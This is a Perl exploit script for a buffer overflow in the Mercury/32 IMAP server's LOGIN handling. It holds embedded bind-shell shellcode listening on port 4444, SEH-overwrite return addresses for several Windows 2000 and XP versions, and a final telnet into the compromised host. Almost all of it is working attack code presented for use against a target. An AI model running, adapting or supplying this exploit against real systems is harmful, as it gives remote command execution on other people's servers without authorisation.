#!/usr/bin/perl
# 
# http://www.securityfocus.com/bid/11775
# credit to Muts for this vulnerability
# acaro [at] jervus.it


use IO::Socket::INET;
use Switch;

if (@ARGV < 3) {
print "--------------------------------------------------------------------\n";
print "Usage : mercury-4444-multi.pl -hTargetIPAddress -oAssemblyinstructions\n";
print " Return address: \n";
print " 1 - Windows 2k Sp4 English Version\n";
print " 2 - Windows 2k Sp4 Italian Version\n";
print " 3 - Windows XP Sp1 English Version\n";
print " 4 - Windows XP Sp0 English Version\n";
print " If values not specified, Windows 2k Sp4 will be used.\n";
print " Example : ./mercury-4444-multi.pl -h127.0.0.1 -o1 -o1\n";
print "--------------------------------------------------------------------\n";
}

use IO::Socket::INET;

my $host = 10.0.0.2;
my $port = 143;
my $reply;
my $request;
my $jmp="\xe9\x02\xff\xff\xff";

my $nextseh = "\x90\x90\xeb\x09";



#A binary translation of NGS Writing Small Shellcode by Dafydd Stuttard with only two little differences
#1)bind port, in this exploit is 4444 in the original shellcode was 6666
#2)4 bytes added to the shellcode in order not to see the window of cmd.exe on remote host
my $shellcode = 
"\x59\x81\xc9\xd3\x62\x30\x20\x41\x43\x4d\x64".
"\x64\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C".
"\x8B\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77".
"\x73\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60".
"\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF".
"\x47\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7".
"\x3A\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B".
"\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4".
"\x5E\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3".
"\xAB\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x11\x5c\x32\xE4".
"\x50\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\xFE\x44".
"\x24\x2c\x83\xEF\x6C\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50".
"\x50\x56\x50\xFF\x56\xE4\xFF\x56\xE8";






foreach (@ARGV) {
$host = $1 if ($_=~/-h((.*)\.(.*)\.(.*)\.(.*))/);
$seh = $1 if ($_=~/-o(.*)/);
$happy = $1 if ($_=~/-o(.*)/);
}

switch ($seh) {
case 1 { $seh="\x43\x8f\x2d\x7c" } # Win2k SP4 English version jmp ebx in advapi32.dll
case 2 { $seh="\x43\x8f\x26\x79" } # Win2k SP4 Italian version jmp ebx in advapi32.dll
case 3 { $seh="\xc0\x5f\x3c\x76" } # WinXP Pro English SP1 version pop ecx pop ecx ret in comdlg32.dll
case 4 { $seh="\xfc\x61\x3c\x76" } # WinXP Pro English SP0 version pop ecx pop ecx ret in comdlg32.dll
}


switch ($happy) {
case 1 { $happy="\x8d\x83\x34\xff\xff\xff\x50\xc3" } # Win2k SP4 English version
case 2 { $happy="\x8d\x83\x34\xff\xff\xff\x50\xc3" } # Win2k SP4 Italian version
case 3 { $happy="\x8b\xc1\x66\x05\x34\x29\x50\xc3" } # WinXP Pro English SP1 version
case 4 { $happy="\x8b\xc1\x66\x05\x34\x29\x50\xc3" } # WinXP Pro English SP0 version
}

my $request ="1 LOGIN".(" "x948)."\{255\}\n";



my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die "Cannot connect to host!\n";

recv($socket, $reply, 1024, 0);
print "Response:" . $reply;

send $socket, $request, 0;
print "[+] Sent 1st request\n";
recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
sleep(1);



my $request ="\x41" x 255;

send $socket, $request, 0;
print "[+] Sent 2nd request\n";
sleep(1);

my $request=("\x45" x7420).("\x90" x10).$happy.("\x90" x14).$shellcode.("\x41" x8).$nextseh.$seh.("\x90" x5).$jmp.("\x90" x533);

send $socket, $request, 0;
print "[+] Sent final request\n";
sleep(1);

close($socket);

print " + connect on port 4444 of $host ...\n";
sleep(3);
system("telnet $host 4444");
exit;
